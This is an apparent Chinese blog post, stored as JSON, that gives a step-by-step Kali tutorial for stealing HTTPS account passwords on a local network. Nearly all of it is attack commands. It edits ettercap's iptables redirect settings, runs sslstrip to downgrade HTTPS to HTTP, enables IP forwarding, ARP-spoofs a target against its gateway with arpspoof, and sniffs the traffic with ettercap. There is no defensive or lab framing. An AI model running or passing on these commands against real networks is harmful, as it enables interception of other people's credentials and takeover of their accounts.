{"title":"内网称霸之《HTTPS账号密码获取》","date":"2018-11-21T17:17:04.000Z","thumbnail":"https://i.loli.net/2018/12/24/5c20d07a0401d.jpg","slug":"HTTPS-password","tags":["ARP欺骗"],"categories":["Kali-内网称霸"],"updated":"2018-12-24T12:26:37.392Z","content":"<p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>\n<h4 id=\"一、将HTTPS转换成HTTP\"><a href=\"#一、将HTTPS转换成HTTP\" class=\"headerlink\" title=\"一、将HTTPS转换成HTTP\"></a>一、将HTTPS转换成HTTP</h4><div class=\"article-bounded\"><div class=\"article-table\"><table><tr><td bgcolor=\"#D1EEEE\">在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。<br>1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；<br>1.1输入/etc/ettercap/etter.conf后找到：<br># if you use iptables:<br>#redir_command_on = “iptables -t nat -A PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”<br>#redir_command_off = “iptables -t nat -D PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”<br>这个地方<br>2.改为（去掉两个#）：<br># if you use iptables:<br>redir_command_on = “iptables <font color=\"red\">-t</font> nat -A PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”<br>redir_command_off = “iptables <font color=\"red\">-t</font> nat -D PREROUTING -i %iface -p tcp –dport %port -j REDIRECT –to-port %rport”<br>3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；<br>4.在该终端窗口下右键选择“复制SSH渠道(S)”；<br>5.接着直接使用HTTP账号密码获取的方法就可以了。<br></td></tr></table></div></div>\n\n<blockquote>\n<blockquote>\n<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/ettercap/etter.conf</span><br><span class=\"line\">i</span><br><span class=\"line\">删除两个<span class=\"comment\">#</span></span><br><span class=\"line\">Esc、Shift ：、wq、回车</span><br><span class=\"line\">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>\n<h4 id=\"二、ARP欺骗和抓包获取HTTPS账号和密码\"><a href=\"#二、ARP欺骗和抓包获取HTTPS账号和密码\" class=\"headerlink\" title=\"二、ARP欺骗和抓包获取HTTPS账号和密码\"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\">cat /proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class=\"line\">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>\n<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>\n","prev":{"title":"算法复习笔记","slug":"algorithm"},"next":{"title":"内网称霸之《HTTP账号密码获取》","slug":"HTTP-password"},"link":"Treecatee.gitgub.io/post/HTTPS-password/","toc":[{"title":"一、将HTTPS转换成HTTP","id":"一、将HTTPS转换成HTTP","index":"1"},{"title":"二、ARP欺骗和抓包获取HTTPS账号和密码","id":"二、ARP欺骗和抓包获取HTTPS账号和密码","index":"2"}],"copyright":{"author":"Treecatee","license":"不可转载-非商用-禁止演绎-保持署名 (<a href=\\\"https://creativecommons.org/licenses/by-nc-sa/4.0/\\\" rel=\\\"external nofollow noopener\\\" target=\\\"_blank\\\">CC BY-NC-ND 4.0</a>)","link":"<a href=\"Treecatee.gitgub.io/post/HTTPS-password/\" title=\"内网称霸之《HTTPS账号密码获取》\">Treecatee.gitgub.io/post/HTTPS-password/</a>","published":"November 22, 2018"}}